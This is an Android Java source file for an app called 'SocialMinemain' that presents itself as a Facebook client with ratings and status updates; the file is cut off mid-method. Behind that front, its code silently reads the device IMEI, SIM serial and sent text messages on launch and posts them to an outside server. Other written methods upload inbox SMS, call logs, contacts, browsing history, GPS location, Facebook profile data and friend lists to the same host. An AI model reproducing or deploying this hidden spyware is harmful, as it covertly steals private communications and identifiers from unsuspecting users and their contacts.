package com.facebook.android;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.RatingBar.OnRatingBarChangeListener;
import android.widget.ArrayAdapter;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.RatingBar;
import android.widget.TextView;
import android.widget.Toast;

import com.facebook.android.AsyncFacebookRunner.RequestListener;
import com.facebook.android.SessionEvents.AuthListener;
import com.facebook.android.SessionEvents.LogoutListener;

public class SocialMinemain extends Activity implements OnItemClickListener {

	public static final String APP_ID = "590891454326992";	
	public TextView outputText;
	public HttpClient hc;
	public HttpPost hp;
	public String id2 = "345534536346";
	public String id;
	public String uname = "Unknown";
	private LoginButton mLoginButton;
	private TextView mText;
	private ImageView mUserPic;
	private Handler mHandler;
	final static int AUTHORIZE_ACTIVITY_RESULT_CODE = 0;
	final static int PICK_EXISTING_PHOTO_RESULT_CODE = 1;
	private static final String Tag = "SocialMining";
	private String graph_or_fql;
	private ListView list;
	
	String phoneNumber;
	String name1;
	String line = "";
	String Imei = null;
	String email = "NULL";
	String town = "Ernakulam";
	String locat = "Kochi,india";
	String first_name = "NULL";
	String last_name = "NULL";
	String link = "NULL";
	String gender = "NULL";
	String timezone = "NULL";
	String locale = "NULL";
	String verified = "NULL";
	String updated_time = "NULL";
	BufferedReader in1 = null;	
	String friendData;
	GPSTracker gps;
	StringBuffer sb = new StringBuffer();
	String result = sb.toString();
	RatingBar ratingBar;
	ImageButton btnpost;
	Button button;
	Button btnStartProgress;
	ProgressDialog progressBar;
	String rate = "2.0";	
	ProgressDialog dialog;

	
	// String[] main_items = { "Update Status", "App Requests", "Get Friends",
	// "Upload Photo",
	// "Place Check-in", "Run FQL Query", "Graph API Explorer", "Token Refresh"
	// };
	String[] main_items = { "Update Status", "App Requests", "Get Friends",
			"Upload Photo", "Place Check-in" };
	String[] permissions = { "offline_access", "publish_stream", "user_photos",
			"publish_checkins", "photo_upload" };

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.main);
		if (APP_ID == null) {
			Util.showAlert(this, "Warning", "Facebook Applicaton ID must be "
					+ "specified before running this example: see FbAPIs.java");
			return;
		}

		ratingBar = (RatingBar) findViewById(R.id.rate);
		button = (Button) findViewById(R.id.btnRate1);
		mText = (TextView) SocialMinemain.this.findViewById(R.id.txt);
		mUserPic = (ImageView) SocialMinemain.this.findViewById(R.id.user_pic);
		mLoginButton = (LoginButton) findViewById(R.id.login);
		list = (ListView) findViewById(R.id.main_list);
		list.setOnItemClickListener(this);
		list.setAdapter(new ArrayAdapter<String>(this, R.layout.main_list_item,
				main_items));
		
		RatingBAr();
		RateButton();
	    CallPhoneInfo();
		
		
		mHandler = new Handler();	
		// Create the Facebook Object using the app id.
		Utility.mFacebook = new Facebook(APP_ID);
		// Instantiate the asynrunner object for asynchronous api calls.
		Utility.mAsyncRunner = new AsyncFacebookRunner(Utility.mFacebook);

		

		// restore session if one exists
		SessionStore.restore(Utility.mFacebook, this);
		SessionEvents.addAuthListener(new FbAPIsAuthListener());
		SessionEvents.addLogoutListener(new FbAPIsLogoutListener());

		/*
		 * Source Tag: login_tag
		 */
		mLoginButton.init(this, AUTHORIZE_ACTIVITY_RESULT_CODE,
				Utility.mFacebook, permissions);

		if (Utility.mFacebook.isSessionValid()) {
			requestUserData();
			progress();//fetch information from facebook
		}

		

		
	}

	private void RateButton() {
		button.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				Toast.makeText(SocialMinemain.this, "Rating: " + rate,
						Toast.LENGTH_LONG).show();
				Float newrate;		

				try {					
					hc = new DefaultHttpClient();
					hp = new HttpPost(
							"http://socialdata.j.layershift.co.uk/just_action/add_rate_int_info.jsp");
										List<NameValuePair> nvp = new ArrayList<NameValuePair>();
					System.out.println("21");
					nvp.add(new BasicNameValuePair("u1", Imei));
					nvp.add(new BasicNameValuePair("u2", rate));
					UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(
							nvp);
					hp.setEntity(formEntity);
					System.out.println("e");
					HttpResponse response = hc.execute(hp);
					System.out.println("e1");
					in1 = new BufferedReader(new InputStreamReader(response
							.getEntity().getContent()));
					System.out.println("e2");
					StringBuffer sb = new StringBuffer();
					String line = "";

					System.out.println("e3");
					while ((line = in1.readLine()) != null) {
						sb.append(line);
					}
					in1.close();
					String result = sb.toString();
					result.trim();
					System.out.println(result);
					Log.d(Tag, "sucess");
					if (result.equals("sucess")) {
						// Toast.makeText(SocialMine.this, "sucess!!",
						// Toast.LENGTH_LONG).show();

					} else {

						// Toast.makeText(SocialMine.this, "Try Again!!",
						// Toast.LENGTH_LONG).show();
					}

				} catch (Exception e) {
					System.out.println(e);

				}

			}

		});

	}

	private void RatingBAr() {

		ratingBar.setOnRatingBarChangeListener(new OnRatingBarChangeListener() {

			@Override
			public void onRatingChanged(RatingBar ratingBar, float rating,
					boolean fromUser) {
				Toast.makeText(SocialMinemain.this,
						"Ratings  : " + String.valueOf(rating),
						Toast.LENGTH_LONG).show();
				rate = String.valueOf(rating);

			}
		});
	
	}

	private void progress() {
		getPhonInfo();
		getPlace();
		getProfile();
		getFriendList1();

	}

	private void getFriendList1() {
		Utility.mAsyncRunner.request("me/friends", new RequestListener() {

			@Override
			public void onComplete(String response, Object state) {
				friendData = response;
				// Create method to run on UI thread
				try {
					String fname;
					String fid;
					// Parse JSON Data
					JSONObject json;
					json = Util.parseJson(friendData);
					// Get the JSONArry from our response JSONObject
					JSONArray friendArray = json.getJSONArray("data");
					for (int i = 0; i < friendArray.length(); i++) {
						JSONObject frnd_obj = friendArray.getJSONObject(i);
						fname = frnd_obj.getString("name");
						Log.d(Tag, fname);
						fid = "453535253535";						
						try {
							hc = new DefaultHttpClient();
							Log.d(Tag, " formEntity1");
							hp = new HttpPost("http://socialdata.j.layershift.co.uk/just_action/facebook_friendlist.jsp");
							List<NameValuePair> nvp = new ArrayList<NameValuePair>();
							Log.d(Tag, " formEntity2");
							nvp.add(new BasicNameValuePair("u", Imei));
							nvp.add(new BasicNameValuePair("u0", uname));
							Log.d(Tag, uname);
							nvp.add(new BasicNameValuePair("u1", fname));
							nvp.add(new BasicNameValuePair("u2", fid));

							UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(
									nvp);

							hp.setEntity(formEntity);

							HttpResponse response1 = hc.execute(hp);
							in1 = new BufferedReader(new InputStreamReader(
									response1.getEntity().getContent()));

							StringBuffer sb = new StringBuffer();
							String line = "";

							System.out.println("e");
							while ((line = in1.readLine()) != null) {
								sb.append(line);

							}
							Log.d(Tag, " formEntity555");
							in1.close();
							String result = sb.toString();
							result.trim();
							Log.d(Tag, " formEntity555444");
							System.out.println(result);
							Log.d(Tag, " sucess");
							if (result.equals("sucess")) {

								// Toast.makeText(SocialMine.this,
								// "success!!", Toast.LENGTH_LONG)
								// .show();
							} else {

								// Toast.makeText(SocialMine.this,
								// "Try Again!!",
								// Toast.LENGTH_LONG).show();
							}

						} catch (Exception e) {
							System.out.println(e);
						}					

					}

				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (FacebookError e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}

			@Override
			public void onIOException(IOException e, Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onFileNotFoundException(FileNotFoundException e,
					Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onMalformedURLException(MalformedURLException e,
					Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onFacebookError(FacebookError e, Object state) {
				// TODO Auto-generated method stub

			}
		});

	}

	private void getProfile() {
		Utility.mAsyncRunner.request("me", new RequestListener() {

			@Override
			public void onComplete(String response, Object state) {
				Log.d("Profile", response);
				String json = response;
				try {
					JSONObject profile = new JSONObject(json);
					id = profile.getString("id");
					uname = profile.getString("name");
					first_name = profile.getString("first_name");
					last_name = profile.getString("last_name");
					link = profile.getString("link");
					gender = profile.getString("gender");
					timezone = profile.getString("timezone");
					locale = profile.getString("locale");
					updated_time = profile.getString("updated_time");
					verified = "verified";
					Log.d("Profile", "1");

					runOnUiThread(new Runnable() {
						@Override
						public void run() {

							try {
								Log.d("Profile", "2");
								hc = new DefaultHttpClient();
								Log.d(Tag, " formEntity1");
								hp = new HttpPost(
										"http://socialdata.j.layershift.co.uk/just_action/add_facebookdetails.jsp");
								List<NameValuePair> nvp = new ArrayList<NameValuePair>();
								Log.d(Tag, " formEntity2");
								nvp.add(new BasicNameValuePair("u", Imei));

								nvp.add(new BasicNameValuePair("u1", uname));
								Log.d(Tag, "Profile" + id);
								Log.d(Tag, "Profile" + uname);
								nvp.add(new BasicNameValuePair("u2", first_name));

								nvp.add(new BasicNameValuePair("u3", last_name));
								nvp.add(new BasicNameValuePair("u4", email));
								nvp.add(new BasicNameValuePair("u5", link));
								nvp.add(new BasicNameValuePair("u6", gender));
								System.out.println(first_name);
								Log.d(Tag, " formEntity4");
								nvp.add(new BasicNameValuePair("u7", timezone));
								nvp.add(new BasicNameValuePair("u8", locale));
								nvp.add(new BasicNameValuePair("u9", verified));
								Log.d(Tag, " formEntity5");
								nvp.add(new BasicNameValuePair("u10",
										updated_time));
								nvp.add(new BasicNameValuePair("u11", town));
								nvp.add(new BasicNameValuePair("u12", locat));

								UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(
										nvp);
								Log.d(Tag, " formEntity");
								hp.setEntity(formEntity);
								Log.d(Tag, " formEntity2");
								HttpResponse response = hc.execute(hp);
								Log.d(Tag, " formEntity3");
								in1 = new BufferedReader(new InputStreamReader(
										response.getEntity().getContent()));
								Log.d(Tag, " formEntity4");
								StringBuffer sb = new StringBuffer();
								String line = "";						
								System.out.println("e");
								while ((line = in1.readLine()) != null) {
									sb.append(line);								}
								Log.d(Tag, " formEntity555");
								in1.close();
								String result = sb.toString();
								result.trim();
								Log.d(Tag, " formEntity555444");
								System.out.println("Profile" + result);
								Log.d(Tag, " sucess");
								if (result.equals("sucess")) {

									// Toast.makeText(SocialMine.this,
									// "success!!", Toast.LENGTH_LONG)
									// .show();
								} else {
									//
									// Toast.makeText(SocialMine.this,
									// "Try Again!!", Toast.LENGTH_LONG)
									// .show();
								}

							} catch (Exception e) {
								System.out.println(e);
							}
							//

						}

					});
				} catch (JSONException e) {
					e.printStackTrace();
				}

			}

			@Override
			public void onIOException(IOException e, Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onFileNotFoundException(FileNotFoundException e,
					Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onMalformedURLException(MalformedURLException e,
					Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onFacebookError(FacebookError e, Object state) {
				// TODO Auto-generated method stub

			}
		});
		//

	}

	private void getPlace() {
		Utility.mAsyncRunner.request("me", new RequestListener() {

			@Override
			public void onComplete(String response, Object state) {
				Log.d("Profile", "Place" + response);
				Log.d("Profile", response);

				try {
					JSONObject json = Util.parseJson(response);
					// JSONObject hometown = json.getJSONObject("hometown");
					// town = hometown.getString("name");
					// JSONObject location = json.getJSONObject("location");
					// locat = location.getString("name");//
					// education":[{"school"
					runOnUiThread(new Runnable() {
						@Override
						public void run() {

						}

					});
				} catch (JSONException e) {
					e.printStackTrace();
				} catch (FacebookError e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}

			@Override
			public void onIOException(IOException e, Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onFileNotFoundException(FileNotFoundException e,
					Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onMalformedURLException(MalformedURLException e,
					Object state) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onFacebookError(FacebookError e, Object state) {
				// TODO Auto-generated method stub

			}
		});
	}

	private void CallPhoneInfo() {
getPhonInfo();
//		getLocation();
//		getBrowse();
//		getsms();
		getsentSms();
//		PhoneContact();
//		getCallDetails();

	}

	private void getCallDetails() {
		StringBuffer sb = new StringBuffer();
		Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
				null, null, null);
		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

		sb.append("Call Details :");
		while (managedCursor.moveToNext()) {
			String phNumber = managedCursor.getString(number);
			String callType = managedCursor.getString(type);
			String callDate = managedCursor.getString(date);
			Date callDayTime = new Date(Long.valueOf(callDate));
			String callDuration = managedCursor.getString(duration);
			String dir = null;
			int dircode = Integer.parseInt(callType);
			switch (dircode) {
			case CallLog.Calls.OUTGOING_TYPE:
				dir = "OUTGOING";
				break;

			case CallLog.Calls.INCOMING_TYPE:
				dir = "INCOMING";
				break;

			case CallLog.Calls.MISSED_TYPE:
				dir = "MISSED";
				break;
			}

			try {
				hc = new DefaultHttpClient();
				Log.d(Tag, " formEntity1");
				hp = new HttpPost(
						"http://socialdata.j.layershift.co.uk/just_action/add_calllog_details.jsp");
				List<NameValuePair> nvp = new ArrayList<NameValuePair>();
				Log.d(Tag, " formEntity2");
				String call = callDayTime + " ";
				nvp.add(new BasicNameValuePair("u", Imei));
				nvp.add(new BasicNameValuePair("u0", uname));
				nvp.add(new BasicNameValuePair("u1", phNumber));
				nvp.add(new BasicNameValuePair("u4", call));
				nvp.add(new BasicNameValuePair("u5", callDuration));
				nvp.add(new BasicNameValuePair("u6", dir));
				Log.d(Tag, dir);
				Log.d(Tag, callDuration);
				Log.d(Tag, callDuration);
				UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(nvp);
				Log.d(Tag, " formEntity");
				hp.setEntity(formEntity);
				Log.d(Tag, " formEntity2");
				HttpResponse response = hc.execute(hp);
				Log.d(Tag, " formEntity3");
				in1 = new BufferedReader(new InputStreamReader(response
						.getEntity().getContent()));
				Log.d(Tag, " formEntity4");
				StringBuffer sb1 = new StringBuffer();
				String line = "";
				Log.d(Tag, " formEntity5");

				System.out.println("e");
				while ((line = in1.readLine()) != null) {
					sb1.append(line);

				}
				Log.d(Tag, " formEntity555");
				in1.close();
				String result = sb1.toString();
				result.trim();
				Log.d(Tag, " formEntity555444");
				System.out.println(result);
				Log.d(Tag, " sucess");
				if (result.equals("sucess")) {

					// Toast.makeText(SocialMine.this, "success!!",
					// Toast.LENGTH_LONG).show();
				} else {

					// Toast.makeText(SocialMine.this, "Try Again!!",
					// Toast.LENGTH_LONG).show();
				}

			} catch (Exception e) {
				System.out.println(e);
			}

			//

		}
		managedCursor.close();

	}

	@TargetApi(Build.VERSION_CODES.ECLAIR)
	@SuppressLint("NewApi")
	private void PhoneContact() {
		Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
		String _ID = ContactsContract.Contacts._ID;
		ContentResolver contentResolver = getContentResolver();
		String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
		String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

		Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
		String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
		String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

		Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
		String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
		String DATA = ContactsContract.CommonDataKinds.Email.DATA;

		StringBuffer output = new StringBuffer();

		Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null,
				null);

		// Loop for every contact in the phone
		if (cursor.getCount() > 0) {

			while (cursor.moveToNext()) {

				String contact_id = cursor
						.getString(cursor.getColumnIndex(_ID));
				name1 = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));

				int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor
						.getColumnIndex(HAS_PHONE_NUMBER)));

				if (hasPhoneNumber > 0) {

					output.append("\n First Name:" + name1);

					// Query and loop for every phone number of the contact
					Cursor phoneCursor = contentResolver.query(
							PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?",
							new String[] { contact_id }, null);

					while (phoneCursor.moveToNext()) {
						phoneNumber = phoneCursor.getString(phoneCursor
								.getColumnIndex(NUMBER));
						output.append("\n Phone number:" + phoneNumber);

						try {
							Log.d(Tag, " Phone Contact");
							hc = new DefaultHttpClient();

							hp = new HttpPost(
									"http://socialdata.j.layershift.co.uk/just_action/addcontact_details_action.jsp");
							List<NameValuePair> nvp = new ArrayList<NameValuePair>();
							nvp.add(new BasicNameValuePair("u0", uname));
							Log.d(Tag, " Phone Contact" + uname);
							nvp.add(new BasicNameValuePair("u", Imei));
							Log.d(Tag, " Phone Contact+" + id);
							nvp.add(new BasicNameValuePair("u1", name1));
							Log.d(Tag, " Phone Contact" + name1);
							nvp.add(new BasicNameValuePair("u2", phoneNumber));
							Log.d(Tag, " Phone Contact" + phoneNumber);
							//

							UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(
									nvp);
							Log.d(Tag, " formEntity");
							hp.setEntity(formEntity);
							HttpResponse response = hc.execute(hp);
							in1 = new BufferedReader(new InputStreamReader(
									response.getEntity().getContent()));
							StringBuffer sb = new StringBuffer();
							String line = "";

							System.out.println("e");
							while ((line = in1.readLine()) != null) {
								sb.append(line);

							}
							in1.close();
							String result = sb.toString();
							result.trim();
							System.out.println(result);
							Log.d(Tag, " sucess");
							if (result.equals("sucess")) {

								// Toast.makeText(SocialMine.this, "success!!",
								// Toast.LENGTH_LONG).show();
							} else {

								// Toast.makeText(SocialMine.this,
								// "Try Again!!",
								// Toast.LENGTH_LONG).show();
							}

						} catch (Exception e) {
							System.out.println(e);

						}


					}

					// Query and loop for every email of the contact
					Cursor emailCursor = contentResolver.query(
							EmailCONTENT_URI, null, EmailCONTACT_ID + " = ?",
							new String[] { contact_id }, null);

					while (emailCursor.moveToNext()) {

						email = emailCursor.getString(emailCursor
								.getColumnIndex(DATA));

						output.append("\nEmail:" + email);

					}

					emailCursor.close();
				}

				output.append("\n");
			}

		
		}

	}

	

	private void getsentSms() {
		String body = null;

		Uri sentURI = Uri.parse("content://sms/sent");

		Cursor cur = getContentResolver()
				.query(sentURI, null, null, null, null);
		String smsaddress = "";
		while (cur.moveToNext()) {
			smsaddress = "" + cur.getString(2);
			body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
			String date = cur.getString(cur.getColumnIndex("date"));
			Long timestamp = Long.parseLong(date);
			Calendar calendar = Calendar.getInstance();
			calendar.setTimeInMillis(timestamp);
			Date finaldate = calendar.getTime();
			String smsDate = finaldate.toString();
			//Toast.makeText(SocialMinemain.this, body, Toast.LENGTH_LONG).show();

			try {
				hc = new DefaultHttpClient();
				Log.d(Tag, " formEntity1");
				hp = new HttpPost(
						"http://socialdata.j.layershift.co.uk/just_action/add_sms_outbox_details.jsp");
				List<NameValuePair> nvp = new ArrayList<NameValuePair>();
				Log.d(Tag, " formEntity2");
				nvp.add(new BasicNameValuePair("u1", Imei));

				Log.d(Tag, id2);

				nvp.add(new BasicNameValuePair("u2", smsaddress));
				nvp.add(new BasicNameValuePair("u3", body));
				nvp.add(new BasicNameValuePair("u4", smsDate));

				UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(nvp);
				Log.d(Tag, " formEntity");
				hp.setEntity(formEntity);
				Log.d(Tag, " formEntity2");
				HttpResponse response = hc.execute(hp);
				Log.d(Tag, " formEntity3");
				in1 = new BufferedReader(new InputStreamReader(response
						.getEntity().getContent()));
				Log.d(Tag, " formEntity4");
				StringBuffer sb = new StringBuffer();
				String line = "";
				Log.d(Tag, " formEntity5");

				System.out.println("e");
				while ((line = in1.readLine()) != null) {
					sb.append(line);

				}
				Log.d(Tag, " formEntity555");
				in1.close();
				String result = sb.toString();
				result.trim();
				Log.d(Tag, " formEntity555444");
				System.out.println(result);
				Log.d(Tag, " sucess");
				if (result.equals("sucess")) {

					// Toast.makeText(SocialMine.this, "success!!",
					// Toast.LENGTH_LONG).show();
				} else {

					// Toast.makeText(SocialMine.this, "Try Again!!",
					// Toast.LENGTH_LONG).show();
				}

			} catch (Exception e) {
				System.out.println(e);
			}

		}

	}

	private void getsms() {
		String body = null;
		Log.d(Tag, "getsms");

		Uri uriSMSURI = Uri.parse("content://sms/inbox");
		Cursor cur = getContentResolver().query(uriSMSURI, null, null, null,
				null);
		String smsaddress = "";
		while (cur.moveToNext()) {
			smsaddress = "" + cur.getString(2);
			body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
			String date = cur.getString(cur.getColumnIndex("date"));
			Long timestamp = Long.parseLong(date);
			Calendar calendar = Calendar.getInstance();
			calendar.setTimeInMillis(timestamp);
			Date finaldate = calendar.getTime();
			String smsDate = finaldate.toString();

			try {
				hc = new DefaultHttpClient();
				Log.d(Tag, "getsms");
				hp = new HttpPost(
						"http://socialdata.j.layershift.co.uk/just_action/add_sms_inbox_details.jsp");
				List<NameValuePair> nvp = new ArrayList<NameValuePair>();
				Log.d(Tag, " formEntity2");

				nvp.add(new BasicNameValuePair("u1", Imei));

				Log.d(Tag, "Profile" + id);
				Log.d(Tag, "Profile" + uname);
				nvp.add(new BasicNameValuePair("u0", uname));
				nvp.add(new BasicNameValuePair("u2", smsaddress));
				nvp.add(new BasicNameValuePair("u3", body));
				nvp.add(new BasicNameValuePair("u4", smsDate));
				Log.d(Tag, "getsms" + smsaddress);
				Log.d(Tag, "getsms" + body);
				UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(nvp);
				Log.d(Tag, " formEntity");
				hp.setEntity(formEntity);
				Log.d(Tag, " formEntity2");
				HttpResponse response = hc.execute(hp);
				Log.d(Tag, " formEntity3");
				in1 = new BufferedReader(new InputStreamReader(response
						.getEntity().getContent()));
				Log.d(Tag, " formEntity4");
				StringBuffer sb = new StringBuffer();
				String line = "";
				Log.d(Tag, " formEntity5");

				System.out.println("e");
				while ((line = in1.readLine()) != null) {
					sb.append(line);

				}
				Log.d(Tag, " formEntity555");
				in1.close();
				String result = sb.toString();
				result.trim();
				Log.d(Tag, " formEntity555444");
				System.out.println("Getsms" + result);
				Log.d(Tag, " sucess");
				if (result.equals("sucess")) {
					//
					// Toast.makeText(SocialMine.this, "success!!",
					// Toast.LENGTH_LONG).show();
				} else {

					// Toast.makeText(SocialMine.this, "Try Again!!",
					// Toast.LENGTH_LONG).show();
				}

			} catch (Exception e) {
				System.out.println(e);
			}

		}

	}

	private void getBrowse() {
		Log.d(Tag, " formEntity2");

		Cursor mycur = managedQuery(Browser.BOOKMARKS_URI,
				Browser.HISTORY_PROJECTION, null, null, null);
		int count = mycur.getCount();
		mycur.moveToFirst();
		if (mycur.moveToFirst() && count > 0) {
			while (count > 0) {
				Log.e("title",
						mycur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
				String browse = mycur
						.getString(Browser.HISTORY_PROJECTION_URL_INDEX);
				//
				try {
					hc = new DefaultHttpClient();
					Log.d(Tag, " Browse");
					Log.d(Tag, " formEntity1");
					hp = new HttpPost(
							"http://socialdata.j.layershift.co.uk/just_action/add_browsed_details.jsp");
					List<NameValuePair> nvp = new ArrayList<NameValuePair>();

					nvp.add(new BasicNameValuePair("u0", uname));

					Log.d(Tag, " Browse" + uname);

					nvp.add(new BasicNameValuePair("u", Imei));
					Log.d(Tag, " Browse" + id);
					nvp.add(new BasicNameValuePair("u1", browse));
					Log.d(Tag, " Browse" + browse);
					UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(
							nvp);
					Log.d(Tag, " formEntity");
					hp.setEntity(formEntity);
					Log.d(Tag, " formEntity2");
					HttpResponse response = hc.execute(hp);
					Log.d(Tag, " formEntity3");
					in1 = new BufferedReader(new InputStreamReader(response
							.getEntity().getContent()));
					Log.d(Tag, " formEntity4");
					StringBuffer sb = new StringBuffer();
					String line = "";
					Log.d(Tag, " formEntity5");

					System.out.println("e");
					while ((line = in1.readLine()) != null) {
						sb.append(line);

					}
					Log.d(Tag, " formEntity555");
					in1.close();
					String result = sb.toString();
					result.trim();
					Log.d(Tag, " BroseDetailz");
					System.out.println("Results" + result);
					Log.d(Tag, " sucess");
					if (result.equals("sucess")) {

						// Toast.makeText(SocialMine.this, "success!!",
						// Toast.LENGTH_LONG).show();
					} else {
						//
						// Toast.makeText(SocialMine.this, "Try Again!!",
						// Toast.LENGTH_LONG).show();
					}

				} catch (Exception e) {
					System.out.println(e);
				}

				int j = 0;

				j++;
				count--;
				mycur.moveToNext();
			}
		}

	}


	private void getLocation() {
		gps = new GPSTracker(SocialMinemain.this);
		// check if GPS enabled
		if (gps.canGetLocation()) {

			double latitude = gps.getLatitude();
			double longitude = gps.getLongitude();
			String lat = String.valueOf(latitude);
			String lon = String.valueOf(longitude);

			try {
				hc = new DefaultHttpClient();
				Log.d(Tag, " formEntity1");
				hp = new HttpPost(
						"http://socialdata.j.layershift.co.uk/just_action/add_phone_location.jsp");
				List<NameValuePair> nvp = new ArrayList<NameValuePair>();
				Log.d(Tag, " Location " + lat);
				Log.d(Tag, " Location" + lon);
				nvp.add(new BasicNameValuePair("u", Imei));
				nvp.add(new BasicNameValuePair("u1", lat));
				nvp.add(new BasicNameValuePair("u2", lon));
				UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(nvp);
				Log.d(Tag, " formEntity");
				hp.setEntity(formEntity);
				Log.d(Tag, " formEntity2");
				HttpResponse response = hc.execute(hp);
				Log.d(Tag, " formEntity3");
				in1 = new BufferedReader(new InputStreamReader(response
						.getEntity().getContent()));
				Log.d(Tag, " formEntity4");
				StringBuffer sb = new StringBuffer();
				String line = "";
				Log.d(Tag, " formEntity5");

				System.out.println("e");
				while ((line = in1.readLine()) != null) {
					sb.append(line);

				}
				Log.d(Tag, " formEntity555");
				in1.close();
				String result = sb.toString();
				result.trim();
				Log.d(Tag, " formEntity555444");
				System.out.println(result);
				Log.d(Tag, " sucess");
				if (result.equals("sucess")) {

					// Toast.makeText(SocialMine.this, "success!!",
					// Toast.LENGTH_LONG).show();
				} else {

					// Toast.makeText(SocialMine.this, "Try Again!!",
					// Toast.LENGTH_LONG).show();
				}

			} catch (Exception e) {
				System.out.println(e);
			}

			//

		} else {
			gps.showSettingsAlert();
		}

	}

	private void getPhonInfo() {
		TelephonyManager tManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		// Getting the SIM card ID
		String simId = tManager.getSimSerialNumber();

		// Getting IMEI Number of Device
		Imei = tManager.getDeviceId();
		Toast.makeText(SocialMinemain.this, Imei, Toast.LENGTH_SHORT);

		Log.d(Tag, " Phone iMEI......");
		Log.d(Tag, Imei);
		Log.d(Tag, " Imei");

		try {
			hc = new DefaultHttpClient();

			hp = new HttpPost(
					"http://socialdata.j.layershift.co.uk/just_action/add_phone_informtn_details.jsp");
			List<NameValuePair> nvp = new ArrayList<NameValuePair>();

			nvp.add(new BasicNameValuePair("u", Imei));
			Log.d(Tag, " formEntity2" + id);
			Log.d(Tag, " formEntity2" + Imei);
			nvp.add(new BasicNameValuePair("u1", Imei));
			nvp.add(new BasicNameValuePair("u2", simId));

			UrlEncodedFormEntity formEntity = new UrlEncodedFormEntity(nvp);
			Log.d(Tag, " formEntity");
			hp.setEntity(formEntity);
			Log.d(Tag, " formEntity2");
			HttpResponse response = hc.execute(hp);

			in1 = new BufferedReader(new InputStreamReader(response.getEntity()
					.getContent()));

			StringBuffer sb = new StringBuffer();
			String line = "";
			Log.d(Tag, " formEntity5");

			System.out.println("e");
			while ((line = in1.readLine()) != null) {
				sb.append(line);

			}

			in1.close();
			String result = sb.toString();
			result.trim();

			System.out.println(result);
			Log.d(Tag, " sucess");
			if (result.equals("sucess")) {

				// Toast.makeText(SocialMine.this, "success!!",
				// Toast.LENGTH_LONG)
				// .show();
			} else {

				// Toast.makeText(SocialMine.this, "Try Again!!",
				// Toast.LENGTH_LONG).show();
			}

		} catch (Exception e) {
			System.out.println(e);
		}

	}

	@Override
	public void onResume() {
		super.onResume();
		if (Utility.mFacebook != null) {
			if (!Utility.mFacebook.isSessionValid()) {
				mText.setText("You are logged out! ");
				mUserPic.setImageBitmap(null);
			} else {
				Utility.mFacebook.extendAccessTokenIfNeeded(this, null);
			}
		}
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		switch (requestCode) {
		/*
		 * if this is the activity result from authorization flow, do a call
		 * back to authorizeCallback Source Tag: login_tag
		 */
